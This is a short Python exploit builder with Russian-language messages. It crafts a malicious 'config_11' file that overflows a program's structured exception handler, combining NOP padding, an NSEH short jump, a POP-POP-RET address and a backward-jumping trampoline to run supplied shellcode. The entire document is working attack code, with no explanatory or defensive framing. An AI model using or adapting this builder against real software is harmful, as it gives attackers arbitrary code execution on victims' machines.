import struct

POP_POP_RET = 0x625012f3
NSEH_OFFSET = 3328

nseh = b"\xeb\x06\x90\x90"
seh  = struct.pack("<I", POP_POP_RET)

trampoline = bytes([
    0xEB, 0x08,               # jmp short +8
    0x58,                     # pop eax
    0x66, 0x2D, 0x17, 0x0D,  # sub ax, 0x0D17
    0xFF, 0xE0,               # jmp eax
    0x90,                     # nop
    0xE8, 0xF3, 0xFF, 0xFF, 0xFF  # call -13
])

def create_exploit(shellcode_bytes, output_file="config_11_exploit"):
    assert b"\x00" not in shellcode_bytes, "null-байты в шеллкоде!"
    padding   = b"\x90" * (NSEH_OFFSET - len(shellcode_bytes))
    after_pad = b"\x90" * (42 - len(trampoline))
    pattern   = shellcode_bytes + padding + nseh + seh + trampoline + after_pad
    with open("config_11", "rb") as f:
        config = bytearray(f.read())
    config[18] = 0x00
    config[19] = 0xAA
    config = config[:54] + pattern
    with open(output_file, "wb") as f:
        f.write(bytes(config))
    print(f"Готово: шеллкод {len(shellcode_bytes)} байт")

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

create_exploit(shellcode)